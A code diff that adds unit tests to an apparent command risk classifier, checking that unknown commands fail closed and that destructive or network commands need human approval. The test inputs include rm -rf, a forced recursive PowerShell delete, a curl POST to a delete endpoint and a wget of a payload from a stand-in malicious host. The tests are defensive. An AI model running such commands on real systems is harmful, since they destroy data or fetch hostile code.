@@ -176,4 +176,36 @@ describe("Risk Classifier — Static Determinism", () => {
     });
     assert.equal(r.effectiveLevel, "R3", "Static must win over model suggestion");
   });
+
+  // ── Fail-closed & new security rules ───────────
+  it("FAIL-CLOSED: unknown command is classified as R3 (HUMAN_REQUIRED)", () => {
+    const r = classifyCommand("random-unknown-binary-exec --foo");
+    assert.equal(r.risk, "R3");
+    assert.ok(requiresHuman(r.risk));
+    assert.equal(isAutomatic(r.risk), false);
+  });
+
+  it("R3: rm -rf is blocked", () => {
+    const r = classifyCommand("rm -rf /tmp/something");
+    assert.equal(r.risk, "R3");
+    assert.ok(requiresHuman(r.risk));
+  });
+
+  it("R3: Remove-Item -Recurse is blocked", () => {
+    const r = classifyCommand("Remove-Item -Path C:\\foo -Recurse -Force");
+    assert.equal(r.risk, "R3");
+    assert.ok(requiresHuman(r.risk));
+  });
+
+  it("R3: curl external mutation is blocked by default", () => {
+    const r = classifyCommand("curl -X POST https://api.example.com/delete");
+    assert.equal(r.risk, "R3");
+    assert.ok(requiresHuman(r.risk));
+  });
+
+  it("R3: wget external mutation is blocked by default", () => {
+    const r = classifyCommand("wget https://malicious.com/payload.sh");
+    assert.equal(r.risk, "R3");
+    assert.ok(requiresHuman(r.risk));
+  });
 });
